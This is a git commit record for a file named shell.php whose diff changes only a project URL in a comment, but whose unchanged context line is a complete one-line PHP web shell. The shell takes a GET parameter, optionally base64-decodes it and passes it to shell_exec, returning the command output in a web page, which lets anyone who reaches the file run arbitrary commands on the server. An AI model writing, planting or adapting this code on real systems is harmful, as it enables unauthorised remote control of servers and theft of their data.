bfb78da99c93a40e0938d4036779064511cf548c
Jonathan Barda <jonathan.barda@gmail.com>
2018-02-21 22:32:52 +0100

    Added project url

--- shell.php
+++ shell.php
@@ -1,2 +1,2 @@
-<!-- One Liner PHP Shell by Jiab77 - https://github.com/jiab77/ -->
+<!-- One Liner PHP Shell by Jiab77 - https://github.com/Jiab77/olpws -->
 <?php echo '<html><head><title>One Liner PHP SHell</title></head><body><pre>'. PHP_EOL . @shell_exec((empty(htmlspecialchars(base64_decode($_GET['e'], true)))?$_GET['e']:base64_decode($_GET['e'])).' 2>&1').'</pre></body></html>'. PHP_EOL; ?>
